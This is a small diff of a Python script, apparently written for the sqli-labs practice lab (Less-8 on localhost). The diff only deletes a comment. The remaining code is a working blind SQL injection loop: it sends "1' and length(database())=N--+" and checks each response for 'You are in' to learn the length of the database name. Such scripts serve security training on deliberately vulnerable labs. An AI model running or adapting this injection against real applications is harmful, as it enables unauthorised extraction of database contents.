@@ -4,7 +4,6 @@ import string
 url ="http://localhost/sqli/Less-8/?id="
 length=0
 for i in range(100):
-    #we will give the payload we are giving in url here ..instead of randomly giving length values here it takes the values from loop and if "You are in" is there then that particular value is the length of database
     payload="1' and length(database())="+str(i)+"--+"
     response =req.get(url+payload)
     if "You are in" in response.text:
